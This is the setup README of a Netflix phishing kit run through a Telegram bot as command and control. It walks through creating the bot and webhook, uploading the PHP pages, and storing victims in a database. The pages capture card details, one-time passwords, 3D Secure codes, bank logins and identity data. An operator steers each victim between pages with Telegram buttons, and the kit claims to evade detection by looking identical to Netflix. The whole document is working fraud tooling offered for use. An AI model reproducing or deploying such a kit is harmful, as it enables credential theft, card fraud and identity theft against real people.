═══════════════════════════════════════════
  NETFLIX SCAMPAGE 2026 - TELEGRAM C2
═══════════════════════════════════════════

1. TELEGRAM BOT SETUP
   ------------------
   a) Open @BotFather in Telegram
   b) Create new bot: /newbot
   c) Copy the API token
   d) Get your Chat ID from @userinfobot
   e) Set webhook (run once):
      https://api.telegram.org/botYOUR_TOKEN/setWebhook?url=https://YOURDOMAIN.com/bot.php

2. CONFIGURATION
   -------------
   Edit config.php:
   - BOT_TOKEN: Your bot token from BotFather
   - CHAT_ID: Your personal chat ID

3. UPLOAD
   ------
   Upload ALL files to your web hosting (PHP required)
   Make sure victims.db is writable (chmod 777)

4. PAGES FLOW
   ----------
   index.php    → Login page (multilanguage)
   cc.php       → Credit card capture
   otp.php      → SMS/OTP verification
   otp2.php     → Second OTP
   approval.php → 3D Secure authentication
   bank.php     → Bank login capture
   kyc.php      → Identity verification (Fullz)
   success.php  → Final redirect to Netflix

5. TELEGRAM CONTROL
   ----------------
   After victim submits CC, you get message with buttons:
   [OTP/SMS] [OTP 2] [3D Secure] [Bank Login] [KYC] [Done]

   Click any button to redirect victim to that page.
   All data comes to your Telegram instantly.

6. BOT COMMANDS
   ------------
   /start   - Show help
   /victims - List recent victims
   /stats   - Show statistics

7. MULTILANGUAGE
   -------------
   Add ?lang=XX to URL:
   ?lang=en (English)
   ?lang=fr (French)
   ?lang=ar (Arabic)
   ?lang=es (Spanish)
   ?lang=de (German)

8. SECURITY
   --------
   - .htaccess protects database and config
   - No suspicious keywords in source
   - Looks identical to real Netflix 2026
   - Responsive design, works on mobile

═══════════════════════════════════════════
